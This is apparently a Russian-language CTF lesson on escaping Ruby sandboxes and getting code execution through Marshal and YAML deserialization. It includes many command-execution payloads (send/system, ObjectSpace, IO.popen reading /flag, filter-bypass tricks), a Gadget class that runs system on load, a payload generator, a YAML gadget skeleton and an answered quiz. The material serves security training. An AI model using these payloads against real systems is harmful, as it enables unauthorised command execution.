---
id: misc-ruby-sandbox
title: "Ruby sandbox escape и десериализация Marshal"
category: misc
parent: misc-sandbox-langs
difficulty: expert
order: 4
tags: [ruby, sandbox, escape, marshal, deserialization, objectspace, ctf]
prerequisites: [misc-sandbox]
useful_for:
  - "CTF Misc/web: побег из Ruby-песочниц и RCE через Marshal"
  - "Bug bounty: десериализация в Ruby on Rails"
  - "Пентест: анализ Ruby-приложений и гемов"
estimated_minutes: 45
summary: "Побег из Ruby-песочниц и эксплуатация Marshal.load: ObjectSpace, eval, send, universal gadget-цепочки и почему Marshal небезопасен для недоверенных данных."
---
## Как устроены Ruby-песочницы

Ruby-песочницы встречаются в CTF-сервисах и в «безопасном» исполнении чужого кода. Типовые подходы: (1) `instance_eval` в контексте `BasicObject` (убирает доступ к `Kernel#system`), (2) белый список методов через `method_missing`, (3) отдельный процесс с `seccomp`/`rlimit`, (4) устаревший `$SAFE`. Слабые места общие: доступ к `ObjectSpace`, `Kernel`, `eval`, `send`/`__send__`, `method`, `binding`, `const_get`. Ruby — очень динамический язык, и из большинства песочниц находится путь к `system`.

Ментальная модель: если у вас есть **любой** способ получить доступ к объекту, классу или binding за пределами песочницы, вы восстановите `Kernel` и выполните команду. Задача — найти такой «мостик».

## Побег: восстановление Kernel

```ruby
# если доступен ObjectSpace — перебрать объекты и найти нужные классы
ObjectSpace.each_object(Class).select { |c| c.name =~ /Kernel|IO|Process/ }
obj = ObjectSpace.each_object(Object).first
K = obj.class.const_get(:Kernel)   # или через Object.const_get
K.system("id")
```

```ruby
# если доступен send, но запрещён system
send(:system, "id")
public_send(:system, "id")
__send__(:system, "id")
```

```ruby
# через method/binding
method(:eval).call('system("id")')
binding.eval('system("id")')
```

Ключевые «методы-джокеры», которые почти всегда ведут к RCE: `eval`, `instance_eval`, `class_eval`, `send`, `__send__`, `public_send`, `method`, `binding`, `const_get`, `define_method`, `open`.

## Обход белых списков

Если песочница фильтрует имена методов, используйте их варианты и построение по частям:

```ruby
# обход строковых фильтров
m = "sys" + "tem"
send(m, "id")
# через symbol
send(:system, "id")           # символ не всегда фильтруется как строка
# через Object
Object.const_get("Kernel").send(:system, "id")
# через process/IO
IO.popen("id").read
Process.spawn("id")
`id`                          # backticks, если доступны
```

Часто фильтр ловит `system`, но пропускает `IO.popen`, `Process.spawn`, backticks или `open("|id")`.

## Marshal.load: почему это RCE

`Marshal.load` десериализует Ruby-объекты из бинарного формата. В формате можно указать любой класс и вызвать его методы (`_load`/`marshal_load`/`initialize`). Если данные недоверенные — атакующий создаёт объект, который при загрузке выполняет код. **Никогда не вызывайте `Marshal.load` на данных от пользователя.**

```ruby
# безобидный на вид код — прямой RCE
data = params[:payload]                    # недоверенный ввод
obj = Marshal.load(data)                   # выполнит код из gadget
```

```ruby
# ручная сборка Marshal-payload (упрощённо)
payload = "\x04\b" + ...                   # заголовок Marshal
Marshal.load(payload)
```

## Gadget-цепочки в Marshal

Прямого «выполнить команду» в Marshal нет — но есть классы, чьи методы при десериализации делают опасные вещи. Классический gadget — `Gem::Requirement`/`Gem::Package::TarReader`/`ERB`/`Net::WriteAdapter`/`Gem::Installer` (наборы зависят от версии Ruby). Идея: собрать цепочку объектов так, чтобы вызов `marshal_load` одного приводил к вызову `system`.

```ruby
# концептуально: класс с marshal_load, вызывающим метод по имени из данных
class Evil
  def marshal_load(cmd)
    system(cmd)     # при Marshal.load выполнит cmd
  end
end
# payload для Evil с аргументом "id"
```

В CTF часто дают готовый «gadget» или уязвимую версию Ruby, где известен набор цепочек (см. `universal_gadget_chain` для Ruby, `Marshal`-эксплойты из публичных исследований).

## Разобранный пример: побег из BasicObject-песочницы

```ruby
# сервис: instance_eval строки в контексте, где нет Kernel
# ввод: код, который надо исполнить
```

Полезная нагрузка, восстанавливающая `Kernel`:

```ruby
ObjectSpace.each_object(Class).find { |c| c.name == "Kernel" }
  .send(:system, "cat /flag")
# либо
Kernel = Object.const_get(:Kernel)
Kernel.system("cat /flag")
# либо через открытый IO
IO.popen("cat /flag") { |f| f.read }
```

Если `ObjectSpace`/`Object` доступны — побег почти гарантирован. Флаг прочитан.

## Справочная таблица: методы-джокеры

| Метод | Назначение | Опасность |
|-------|-----------|-----------|
| `eval`/`instance_eval` | исполнить строку | RCE |
| `send`/`__send__` | вызвать метод по имени | обход whitelist |
| `method`/`binding` | получить вызываемый объект | доступ к контексту |
| `const_get` | получить константу/класс | доступ к `Kernel` |
| `ObjectSpace` | перебор объектов | восстановление классов |
| `IO.popen`/`Process.spawn` | запуск процесса | RCE |
| backticks `` ` `` | запуск команды | RCE |
| `Marshal.load` | десериализация | RCE через gadget |

## Типовые ошибки новичка

- **Сдаваться после блокировки `system`.** Ищите `IO.popen`, backticks, `Process.spawn`, `open("|")`.
- **Забыть про `ObjectSpace`.** Это самый прямой путь к `Kernel`.
- **Считать Marshal «просто сериализацией».** Это полноценная десериализация с вызовом методов.
- **Не проверить версию Ruby.** Набор gadget-цепочек зависит от версии.
- **Игнорировать `$SAFE`.** В старых версиях `$SAFE=4` ещё оставлял дыры.

## Что дальше / решение

Порядок: понять, что доступно (ObjectSpace, eval, send, Object) → найти «метод-джокер» → восстановить `Kernel`/выполнить команду. Для Marshal — определить, где данные десериализуются, и собрать gadget. Связанные уроки: `misc-sandbox`, `misc-sandbox-langs`, `misc-nodejs-sandbox`, `misc-python-sandbox`. Решение — когда флаг прочитан или доказано выполнение кода.

## Расширенный разбор: как строится Marshal-payload

Marshal-формат — это поток байт с тегами типов (`\x04\x08` — версия, `T`/`o`/`:` — объекты/символы/строки). Чтобы собрать payload, можно:

1. **Сгенерировать сериализацией:** создать нужный объект в Ruby и вызвать `Marshal.dump(obj)`, затем подправить байты.
2. **Вручную** собрать по спецификации (для точного контроля над классами).

```ruby
# генерация заготовки
class Gadget
  def initialize(cmd) = @cmd = cmd
  def marshal_load(cmd) = system(cmd)   # вызовется при load
end
File.binwrite('payload.bin', Marshal.dump(Gadget.new('id')))
```

Для реальных цепочек (без своего класса, которого на сервере нет) собирают комбинацию из классов, присутствующих в приложении (Gem, ERB, Net и т. п.), где `marshal_load` одного вызывает метод другого. Готовые цепочки публикуются для конкретных версий Ruby/Rails (напр. через `Gem::Requirement` + `Gem::Package::TarReader` + `Net::WriteAdapter`). Если сервер принимает `Marshal.load` от пользователя — считайте это RCE.

## Практический чек-лист

1. Определить тип песочницы (BasicObject, whitelist, процесс, `$SAFE`).
2. Проверить доступ к `ObjectSpace`, `Object`, `Kernel`, `eval`, `send`, `method`, `binding`.
3. Найти «метод-джокер» и восстановить `Kernel`.
4. Если `system` заблокирован — попробовать `IO.popen`, backticks, `Process.spawn`, `open("|")`.
5. Проверить, где применяется `Marshal.load`/`YAML.load` на недоверенных данных.
6. Для Marshal — определить версию Ruby и подобрать gadget-цепочку.
7. Зафиксировать PoC: команда, вывод, флаг.

## Материалы и связанные техники

Полезно держать под рукой спецификацию Marshal-формата и публичные наборы gadget-цепочек для Ruby (они привязаны к версии). Для YAML-десериализации (`YAML.load`) работает та же логика: это тоже небезопасная десериализация, часто через `!ruby/object:` теги. Практика на CTF: ищите `Marshal.load`, `YAML.load`, `eval`, `instance_eval` в серверном коде и определите, приходит ли туда пользовательский ввод. Связанные уроки: `misc-sandbox-langs`, `misc-sandbox`, `misc-nodejs-sandbox`, `misc-python-sandbox`.

## Дополнительный пример: YAML-десериализация

`YAML.load` (в отличие от `YAML.safe_load`) умеет создавать произвольные объекты Ruby по тегам вида `!ruby/object:ClassName`. Это второй (после Marshal) путь к RCE через десериализацию.

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  ...
```

```ruby
# если сервер делает YAML.load(params[:data]) — это RCE
obj = YAML.load(untrusted)   # создаст объект и вызовет его методы
```

Защита — только `YAML.safe_load` с явным белым списком классов. В CTF проверяйте обе точки (`Marshal` и `YAML`) и версию Ruby: цепочки для YAML исторически строились через `Gem::Requirement`, `ERB`, `Net::WriteAdapter`. Если версия устарела — берите готовый публичный PoC под неё и подставляйте команду для чтения флага.

## Квиз

```quiz
- question: "Почему Marshal.load опасен для недоверенных данных?"
  options:
    - "Он исполняет marshal_load/_load при десериализации"
    - "Он только парсит JSON"
    - "Он шифрует данные"
    - "Он безвреден"
  answer: 0
  explanation: "Десериализация вызывает методы объекта."
- question: "Что позволяет обойти запрет методов в Ruby-песочнице?"
  options:
    - "send / public_send / eval"
    - "puts"
    - "print"
    - "nil"
  answer: 0
  explanation: "send вызывает метод в обход видимости."
- question: "Чем полезна ObjectSpace при побеге?"
  options:
    - "Позволяет найти классы/объекты (например, Kernel)"
    - "Ускоряет код"
    - "Шифрует строки"
    - "Удаляет объекты"
  answer: 0
  explanation: "ObjectSpace даёт доступ ко всем объектам."
- question: "Что такое gadget-цепочка в контексте Marshal?"
  options:
    - "Последовательность классов с _load, приводящая к RCE"
    - "Тип массива"
    - "Формат JSON"
    - "Метод шифрования"
  answer: 0
  explanation: "Gadget-цепочка использует классы гемов."
- question: "Что стало с $SAFE в современном Ruby?"
  options:
    - "Удалён (не защищает)"
    - "Включён по умолчанию"
    - "Заменён на Marshal"
    - "Это метод"
  answer: 0
  explanation: "$SAFE удалён в Ruby 3."
```

## Где пригодится

- **CTF Misc/web:** побег из Ruby-песочниц и RCE.
- **Bug bounty:** десериализация в Rails и гемах.
- **Пентест:** анализ Ruby-приложений.
- **Работа:** безопасная десериализация (JSON вместо Marshal).
- **Дальше по дереву:** `misc-sandbox`, `misc-sandbox-langs`, `misc-nodejs-sandbox`.
